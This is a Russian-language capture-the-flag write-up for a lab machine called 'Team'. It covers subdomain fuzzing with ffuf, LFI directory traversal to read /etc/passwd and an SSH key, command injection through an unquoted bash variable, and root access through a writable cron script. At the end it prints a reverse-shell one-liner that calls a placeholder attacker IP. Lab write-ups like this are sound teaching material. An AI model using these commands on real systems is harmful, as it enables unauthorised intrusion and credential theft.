# Team

### Необходимые навыки

- Перебор поддоменов и виртуальных хостов через ffuf
- Эксплуатация LFI (Local File Inclusion) через directory traversal
- Понимание log poisoning и session poisoning (и их ограничений)
- Базовое понимание bash — command injection через неэкранированную переменную
- Работа с cron-задачами и файлами скриптов

---

### Получение шелла

Начинаю со сканирования портов. Всё стандартно: SSH (22), HTTP (80) и FTP (21) — но анонимный доступ к FTP закрыт, так что пока откладываю его в сторону. На 80 порту — дефолтная заглушка Apache.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/9a153a73-6d3c-4d40-9737-c2bcc2873916" />

Фаззю поддиректории через ffuf по словарю с расширениями `.php` и `.html` — пусто. Поддомены тоже ничего не дают. Из отчаяния попробовала поменять домен в `/etc/hosts` на `team.thm` — и сработало (честно говоря, это больше похоже на угадывание, чем на пентест, но окей). Попадаем на сайт, который ничем особо не богат: ссылки не кликаются, в коде страниц нет ничего полезного. Пробую IDOR через перебор номеров в путях к картинкам (`http://team.thm/images/fulls/01.jpg`) — безрезультатно. Фаззю поддиректории — нахожу только пустой `robots.txt` и разделы `/scripts`, `/assets`, но прав на их просмотр нет.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/aa713d58-262a-488c-b18b-83c9564ad3ad" />

HTTP verb tampering тоже не даёт ничего. Перехожу к перебору поддоменов:

```
ffuf -u http://team.thm/ -H 'Host: FUZZ.team.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -ic -c -fs 11366
```

<img width="600" height="70" alt="image" src="https://github.com/user-attachments/assets/140e9406-fee9-423e-83e7-d7e948a5f811" />

Находим `dev.team.thm` — добавляю в `/etc/hosts` и перехожу. На сайте сразу бросается в глаза параметр `page=` в URL — классический индикатор потенциальной LFI.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/c58e98a3-9dbc-488b-8d8a-bfa3ff192d57" />

Пробую directory traversal — работает. Теперь можно читать системные файлы. Узнаю список пользователей из `/etc/passwd`, пробую прочитать их приватные SSH-ключи (`../../home/gyles/.ssh/id_rsa`) — страница возвращает пустой ответ.

<img width="600" height="150" alt="image" src="https://github.com/user-attachments/assets/5baa2886-9f04-463f-adcc-9542337df538" />

Пробую log poisoning через `/var/log/apache2/access.log` — файл недоступен. Session poisoning тоже не выходит: создаю куки с PHPSESSID и проверяю `/var/lib/php/sessions/sess_...` — ничего не сохранилось.

Раз стандартные векторы не прошли — фаззю саму LFI по специализированному словарю:

```
ffuf -u http://dev.team.thm/script.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -ic -c -fs 1,2203
```

Перебирая доступные файлы, нахожу приватный SSH-ключ, оставленный прямо в `sshd_config`.

<img width="600" height="456" alt="image" src="https://github.com/user-attachments/assets/4ec6f0f6-7ec9-47bc-bc09-5666ba15b28e" />

Копирую ключ в файл, выставляю права (`chmod 700 ssh`) и подключаюсь под пользователем `dale` (обнаруженным ранее в `/etc/passwd`). Первый флаг получен.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/a9bf7725-2bd5-4da7-8790-6be46e79f89d" />

---

### Повышение привилегий до root

Признаюсь честно: раз машина лёгкая, глубокое ручное перечисление пропустила и просто шла по очевидным подсказкам автора.

Первым делом проверяю `sudo -l` — можно без пароля запускать некий скрипт от имени `gyles`. Видимо, нужно сначала взять `gyles`, а через него — root.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/31572b55-987e-48e7-bfc8-169b33690432" />

Смотрю скрипт и замечаю неэкранированную переменную `$error`. В bash переменная без кавычек в контексте `eval` или `exec` заставляет интерпретатор разбить строку на слова: первое трактуется как команда, остальные — как её аргументы. Это классический вектор command injection.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/690e135c-102e-48c3-89ca-ef08f517be52" />

Запускаю скрипт от имени `gyles` и подставляю в `$error` запуск оболочки:

```bash
sudo -u gyles ./admin_checks
```

<img width="600" height="52" alt="image" src="https://github.com/user-attachments/assets/21b72aa0-4361-4ae3-9efb-acd0d0d4dffe" />

Через `id` вижу, что `gyles` состоит в группе `admin` — у `dale` такой группы не было. Предполагаю, что привилегии пойдут через неё. Ищу файлы, владелец которых — root, а группа `admin` имеет права на запись:

```bash
find / -group admin -writable 2>/dev/null
```

<img width="600" height="191" alt="image" src="https://github.com/user-attachments/assets/5a003236-d2e1-4997-9591-03d7f3606c85" />

Нахожу файл `main_backup.sh`. Проверяю папку `/var/backups/www/team.thm` — последний бэкап был минуту назад: скрипт явно запускается по расписанию.

<img width="600" height="194" alt="image" src="https://github.com/user-attachments/assets/3999b551-80d1-43b0-bee4-4bb779375f17" />

Раз скрипт выполняется от root, добавляю в него reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/<your_ip>/5555 0>&1"
```

Открываю порт и жду исполнения кронтаба — ловлю shell от root. Второй флаг взят.

<img width="600" height="152" alt="image" src="https://github.com/user-attachments/assets/1b29dbd4-c761-45eb-a365-4374392a0b86" />
